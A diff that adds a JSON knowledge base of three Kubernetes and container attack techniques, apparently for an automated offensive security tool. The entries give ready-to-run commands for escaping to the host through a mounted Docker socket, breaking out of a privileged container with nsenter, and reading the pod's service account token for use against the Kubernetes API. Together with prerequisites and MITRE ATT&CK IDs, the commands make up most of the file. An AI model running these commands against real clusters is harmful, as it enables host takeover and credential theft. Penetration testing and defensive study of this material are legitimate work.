@@ -1,0 +1,54 @@
+[
+  {
+    "id": "k8s-001",
+    "category": "cloud",
+    "subcategory": "container_escape",
+    "title": "Docker Socket Mount Escape",
+    "description": "If /var/run/docker.sock is mounted inside the container, create a privileged container to escape to the host.",
+    "techniques": [
+      "docker -H unix:///var/run/docker.sock run --privileged -v /:/host -it alpine chroot /host",
+      "ls -la /var/run/docker.sock"
+    ],
+    "indicators": ["/var/run/docker.sock exists", "docker CLI available in container"],
+    "prerequisites": ["Docker socket mounted", "docker CLI installed"],
+    "tools": ["docker", "check_mounts"],
+    "tags": ["docker", "escape", "privileged", "container", "socket"],
+    "confidence": 0.95,
+    "mitre_attack": "T1611"
+  },
+  {
+    "id": "k8s-002",
+    "category": "cloud",
+    "subcategory": "container_escape",
+    "title": "Privileged Container nsenter Escape",
+    "description": "From a privileged container, use nsenter to enter host namespaces and execute commands on the host.",
+    "techniques": [
+      "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
+      "cat /proc/1/status | grep -i cap"
+    ],
+    "indicators": ["Container running with --privileged flag", "CAP_SYS_ADMIN capability"],
+    "prerequisites": ["Privileged container", "nsenter available"],
+    "tools": ["check_capabilities", "nsenter"],
+    "tags": ["privileged", "nsenter", "escape", "container"],
+    "confidence": 0.95,
+    "mitre_attack": "T1611"
+  },
+  {
+    "id": "k8s-003",
+    "category": "cloud",
+    "subcategory": "rbac_abuse",
+    "title": "ServiceAccount Token Enumeration",
+    "description": "Enumerate the mounted service account token to discover K8s API access and RBAC permissions.",
+    "techniques": [
+      "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
+      "kubectl auth can-i --list -n <namespace>",
+      "curl -k https://kubernetes.default.svc/api/v1/namespaces/ -H 'Authorization: Bearer <TOKEN>'"
+    ],
+    "indicators": ["K8s service account token mounted", "kubectl available or K8s API reachable"],
+    "prerequisites": ["Pod running in K8s cluster", "Service account token mounted"],
+    "tools": ["kubectl_auth_check", "kubectl_get_pods"],
+    "tags": ["kubernetes", "rbac", "serviceaccount", "token", "enumeration"],
+    "confidence": 0.9,
+    "mitre_attack": "T1525"
+  }
+]
